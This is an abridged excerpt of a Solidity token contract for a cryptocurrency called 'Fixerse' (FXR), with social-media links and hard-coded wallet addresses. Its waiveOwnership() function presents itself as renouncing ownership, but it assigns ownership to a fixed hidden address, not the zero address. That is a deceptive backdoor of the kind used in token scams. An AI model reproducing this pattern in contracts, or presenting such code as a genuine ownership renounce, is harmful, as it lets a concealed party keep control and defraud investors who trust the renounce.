...
/**
Telegram : https://t.me/FixersePortal
Website : https://fixerse.com/
Twitter : https://twitter.com/FixerseCoin
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xDef3B244F71cc713D0AEE3984C076F81202362E6);
    }
...
contract Fixerse is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Fixerse";
    string private _symbol = "FXR";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xFaEaDfa8AEE58eF1FADC2C82eBFd11BDcA3d0668);
    address payable public teamWalletAddress = payable(0xFaEaDfa8AEE58eF1FADC2C82eBFd11BDcA3d0668);
